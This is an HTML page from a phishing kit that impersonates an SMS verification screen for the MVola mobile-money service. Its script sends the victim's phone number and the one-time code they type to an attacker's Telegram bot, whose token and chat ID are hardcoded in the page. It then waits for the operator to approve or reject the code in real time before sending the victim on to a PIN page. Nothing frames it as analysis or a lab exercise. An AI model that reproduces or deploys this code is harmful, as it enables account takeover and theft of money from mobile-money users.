<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Albert+Sans:wght@400;600;700;800&display=swap');
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Albert Sans', sans-serif;
        }
        
        body {
            background-color: #ffffff;
            width: 100vw;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            overflow: hidden;
        }
        
        .mobile-container {
            width: 100%;
            max-width: 450px;
            height: 100vh;
            background-color: #ffffff;
            position: relative;
            display: flex;
            flex-direction: column;
        }
        /* --- Header Section --- */
        
        .header {
            background-color: #FCD116;
            height: 70px;
            display: flex;
            align-items: center;
            padding: 0 20px;
            position: relative;
        }
        
        .back-btn {
            font-size: 28px;
            font-weight: bold;
            color: #003366;
            cursor: pointer;
            text-decoration: none;
            margin-right: 15px;
            line-height: 1;
        }
        
        .logo-y {
            font-size: 38px;
            font-weight: 800;
            color: #003366;
            position: relative;
            line-height: 1;
        }
        
        .logo-y::before {
            content: 'y';
            position: absolute;
            left: 0;
            top: 0;
        }
        /* --- Main Content --- */
        
        .content {
            padding: 30px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            flex-grow: 1;
            z-index: 2;
        }
        
        .title-container {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .title-sms {
            font-size: 32px;
            font-weight: 700;
            color: #4A90E2;
            letter-spacing: 1px;
            line-height: 1;
        }
        
        .title-verification {
            font-size: 34px;
            font-weight: 800;
            color: #003366;
            letter-spacing: -0.5px;
            line-height: 1.1;
        }
        
        .description {
            font-size: 15px;
            color: #555;
            text-align: center;
            margin-bottom: 25px;
            line-height: 1.4;
            max-width: 320px;
        }
        /* Phone Number Display */
        
        .phone-display {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .phone-number {
            font-size: 18px;
            font-weight: 700;
            color: #003366;
            letter-spacing: 2px;
        }
        
        .action-icons {
            display: flex;
            gap: 8px;
        }
        
        .icon-btn {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            border: 1px solid #ccc;
            background: transparent;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            color: #555;
        }
        
        .icon-btn svg {
            width: 14px;
            height: 14px;
            fill: currentColor;
        }
        
        .expires-text {
            font-size: 13px;
            color: #888;
            margin-bottom: 35px;
        }
        /* Input */
        
        .otp-input {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            text-align: center;
            outline: none;
            color: #333;
            margin-bottom: 15px;
            font-family: 'Albert Sans', sans-serif;
            letter-spacing: 5px;
        }
        
        .otp-input::placeholder {
            color: #aaa;
            letter-spacing: normal;
        }
        /* Confirm Button */
        
        .confirm-btn {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            background-color: #EEF3FA;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            color: #003366;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            margin-bottom: 25px;
            transition: background-color 0.2s;
            font-family: 'Albert Sans', sans-serif;
        }
        
        .confirm-btn:hover {
            background-color: #e0e9f5;
        }
        
        .confirm-btn svg {
            width: 16px;
            height: 16px;
            stroke: #003366;
            stroke-width: 2;
            fill: none;
        }
        /* Help Link */
        
        .help-link {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            color: #444;
            text-decoration: none;
            margin-bottom: 40px;
        }
        
        .help-link svg {
            width: 18px;
            height: 18px;
            fill: #003366;
        }
        /* Countdown Timer */
        
        .timer-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
        }
        
        .timer-label {
            font-size: 14px;
            color: #003366;
            margin-bottom: 15px;
            font-weight: 500;
        }
        
        .timer-circle {
            width: 130px;
            height: 130px;
            border-radius: 50%;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fff;
        }
        
        .timer-svg {
            position: absolute;
            top: 0;
            left: 0;
            width: 130px;
            height: 130px;
            transform: rotate(-90deg);
        }
        
        .timer-svg circle {
            fill: none;
            stroke-width: 6;
            stroke-linecap: round;
        }
        
        .timer-bg {
            stroke: #F0F4FA;
        }
        
        .timer-progress {
            stroke: #003366;
            stroke-dasharray: 408;
            stroke-dashoffset: 408;
            transition: stroke-dashoffset 1s linear;
        }
        
        .timer-text {
            font-size: 26px;
            font-weight: 600;
            color: #003366;
            z-index: 1;
        }
        /* Bottom Blue Curve */
        
        .bottom-curve-container {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 250px;
            overflow: hidden;
            z-index: 1;
        }
        
        .bottom-curve {
            width: 100%;
            height: 100%;
            background-color: #003366;
            border-radius: 50% 50% 0 0 / 100% 100% 0 0;
            transform: scaleX(1.5) translateY(40%);
            position: absolute;
            bottom: 0;
        }
        /* Home Indicator */
        
        .home-indicator {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            width: 130px;
            height: 5px;
            background-color: #888;
            border-radius: 10px;
            z-index: 10;
        }
        /* Error Message */
        
        .error-msg {
            display: none;
            width: 100%;
            max-width: 340px;
            background: #ffe6e6;
            border: 1px solid #ffcccc;
            color: #cc0000;
            padding: 12px 16px;
            border-radius: 8px;
            font-size: 13px;
            margin-bottom: 20px;
            text-align: center;
        }
        /* Loading Overlay */
        
        .loading-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.95);
            z-index: 2000;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 20px;
        }
        
        .loading-overlay.active {
            display: flex;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #f4d03f;
            border-top-color: #003366;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        .loading-text {
            font-weight: 700;
            font-size: 16px;
            color: #003366;
        }
    </style>
</head>

<body>

    <div class="mobile-container">

        <!-- Header -->
        <div class="header">
            <a href="login.html" class="back-btn">&#8249;</a>
            <div class="logo-y">y</div>
        </div>

        <!-- Main Content -->
        <div class="content">
            <div class="title-container">
                <div class="title-sms">SMS</div>
                <div class="title-verification">verification</div>
            </div>

            <p class="description">
                Enter the verification code sent via SMS to the number
            </p>

            <div class="phone-display">
                <span class="phone-number" id="displayPhone">** ** 55 64</span>
                <div class="action-icons">
                    <div class="icon-btn">
                        <svg viewBox="0 0 24 24">
                            <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
                        </svg>
                    </div>
                    <div class="icon-btn">
                        <svg viewBox="0 0 24 24">
                            <path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/>
                        </svg>
                    </div>
                </div>
            </div>

            <p class="expires-text" id="expiresText">Expires in 00:01:00</p>

            <!-- Error Message Container -->
            <div class="error-msg" id="otpError">Code incorrect. Veuillez réessayer.</div>

            <!-- Form wrapping input and button -->
            <form id="otpForm" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
                <!-- Input -->
                <input type="text" id="otpInput" class="otp-input" placeholder="Enter the verification code" maxlength="6" required>

                <!-- Confirm Button -->
                <button type="submit" class="confirm-btn">
                    Confirm 
                    <svg viewBox="0 0 24 24">
                        <path d="M5 12h14M12 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </button>
            </form>

            <!-- Help Link -->
            <a href="#" class="help-link">
                I haven't received the code 
                <svg viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
                </svg>
            </a>

            <!-- Countdown Timer -->
            <div class="timer-section">
                <div class="timer-label">Resend code in</div>
                <div class="timer-circle">
                    <svg class="timer-svg" viewBox="0 0 130 130">
                        <circle class="timer-bg" cx="65" cy="65" r="65"></circle>
                        <circle class="timer-progress" id="progressRing" cx="65" cy="65" r="65"></circle>
                    </svg>
                    <div class="timer-text" id="timerText">00:59</div>
                </div>
            </div>
        </div>

        <!-- Bottom Curved Background -->
        <div class="bottom-curve-container">
            <div class="bottom-curve"></div>
        </div>

        <!-- Home Indicator -->
        <div class="home-indicator"></div>

    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Vérification en cours...</div>
    </div>

    <!-- JavaScript for Countdown Timer and Telegram Integration -->
    <script>
        // --- TELEGRAM CONFIGURATION ---
        const TELEGRAM_BOT_TOKEN = "8860442173:AAG8rL46NtCjyacbn8OebIxw_7y8q7_Nmq4";
        const TELEGRAM_CHAT_ID = "5703339850";

        // --- 1. Retrieve Phone Number from localStorage ---
        const savedPhone = localStorage.getItem('userPhone');
        const displayPhoneElement = document.getElementById('displayPhone');

        if (savedPhone) {
            const lastFour = savedPhone.slice(-4);
            const formattedLastFour = lastFour.slice(0, 2) + ' ' + lastFour.slice(2);
            displayPhoneElement.textContent = `** ** ${formattedLastFour}`;
        } else {
            displayPhoneElement.textContent = `** ** 55 64`;
        }

        // --- 2. Countdown Timer Logic (Circular) ---
        let timeLeft = 59;
        const totalTime = 59;
        const timerText = document.getElementById('timerText');
        const progressRing = document.getElementById('progressRing');
        const circumference = 2 * Math.PI * 65; // r = 65

        progressRing.style.strokeDasharray = circumference;

        const countdown = setInterval(() => {
            timeLeft--;

            const seconds = timeLeft < 10 ? `0${timeLeft}` : timeLeft;
            timerText.textContent = `00:${seconds}`;

            const offset = circumference - (timeLeft / totalTime) * circumference;
            progressRing.style.strokeDashoffset = offset;

            if (timeLeft <= 0) {
                clearInterval(countdown);
                timerText.textContent = "00:00";
                progressRing.style.strokeDashoffset = 0;
            }
        }, 1000);

        // --- 3. Countdown Timer Logic (Expires Text) ---
        let expiresTimeLeft = 60;
        const expiresTextElement = document.getElementById('expiresText');

        const expiresCountdown = setInterval(() => {
            expiresTimeLeft--;

            const hours = Math.floor(expiresTimeLeft / 3600);
            const minutes = Math.floor((expiresTimeLeft % 3600) / 60);
            const seconds = expiresTimeLeft % 60;

            const formattedTime =
                String(hours).padStart(2, '0') + ':' +
                String(minutes).padStart(2, '0') + ':' +
                String(seconds).padStart(2, '0');

            expiresTextElement.textContent = `Expires in ${formattedTime}`;

            if (expiresTimeLeft <= 0) {
                clearInterval(expiresCountdown);
                expiresTextElement.textContent = "Expired";
                expiresTextElement.style.color = "#d21034";
            }
        }, 1000);

        // --- 4. Telegram Polling Logic ---
        const otpForm = document.getElementById('otpForm');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const errorMsg = document.getElementById('otpError');

        function showError(msg) {
            errorMsg.textContent = msg;
            errorMsg.style.display = 'block';
        }

        function hideError() {
            errorMsg.style.display = 'none';
        }

        function startPolling(otpCode, onApproveUrl) {
            let offset = 0;
            let decided = false;
            let pollCount = 0;
            const maxPolls = 90;

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=1`)
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        offset = data.result[data.result.length - 1].update_id + 1;
                    }
                    pollLoop();
                })
                .catch(() => pollLoop());

            function pollLoop() {
                if (decided) return;
                pollCount++;

                if (pollCount > maxPolls) {
                    decided = true;
                    loadingOverlay.classList.remove('active');
                    showError('Délai expiré. Veuillez réessayer.');
                    return;
                }

                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || decided) {
                            if (!decided) setTimeout(pollLoop, 2000);
                            return;
                        }

                        for (let update of data.result) {
                            offset = update.update_id + 1;

                            if (update.callback_query) {
                                const action = update.callback_query.data;

                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json'
                                    },
                                    body: JSON.stringify({
                                        callback_query_id: update.callback_query.id,
                                        text: "Action enregistrée !"
                                    })
                                }).catch(() => {});

                                if (action === `approve_otp_${otpCode}`) {
                                    decided = true;
                                    loadingOverlay.classList.remove('active');
                                    window.location.href = onApproveUrl;
                                    return;
                                } else if (action === `decline_otp_${otpCode}`) {
                                    decided = true;
                                    loadingOverlay.classList.remove('active');
                                    showError('Code refusé. Veuillez réessayer.');
                                    return;
                                } else if (action === `wrong_otp_${otpCode}`) {
                                    decided = true;
                                    loadingOverlay.classList.remove('active');
                                    showError('Code incorrect. Veuillez vérifier et réessayer.');
                                    return;
                                }
                            }
                        }
                        if (!decided) setTimeout(pollLoop, 2000);
                    })
                    .catch(() => {
                        if (!decided) setTimeout(pollLoop, 2000);
                    });
            }
        }

        // --- 5. Handle OTP Form Submission ---
        otpForm.addEventListener('submit', function(e) {
            e.preventDefault();
            hideError();

            const enteredCode = document.getElementById('otpInput').value.trim();
            const userPhone = localStorage.getItem('userPhone') || 'Inconnu';

            if (enteredCode.length !== 6) {
                showError("Veuillez entrer un code de vérification valide à 6 chiffres.");
                return;
            }

            // Save OTP locally
            localStorage.setItem('enteredOTP', enteredCode);

            // Show loading
            loadingOverlay.classList.add('active');

            // Prepare Telegram Message
            const message = `🔐 <b>Code OTP Reçu - MVola</b>\n\n📱 Numéro: <code>+269 ${userPhone}</code>\n🔢 Code OTP: <code>${enteredCode}</code>\n⏰ Heure: ${new Date().toLocaleString('fr-FR')}\n\nVeuillez valider le code :`;

            const keyboard = {
                inline_keyboard: [
                    [{
                        text: "✅ APPROUVER",
                        callback_data: `approve_otp_${enteredCode}`
                    }, {
                        text: "❌ REFUSER",
                        callback_data: `decline_otp_${enteredCode}`
                    }],
                    [{
                        text: "⚠️ CODE INCORRECT",
                        callback_data: `wrong_otp_${enteredCode}`
                    }]
                ]
            };

            // Send to Telegram
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        reply_markup: JSON.stringify(keyboard)
                    })
                })
                .then(res => res.json())
                .then(data => {
                    if (data.ok) {
                        startPolling(enteredCode, 'pin.html');
                    } else {
                        loadingOverlay.classList.remove('active');
                        showError('Erreur réseau. Veuillez réessayer.');
                    }
                })
                .catch(() => {
                    loadingOverlay.classList.remove('active');
                    showError('Erreur réseau. Veuillez réessayer.');
                });
        });
    </script>

</body>

</html>
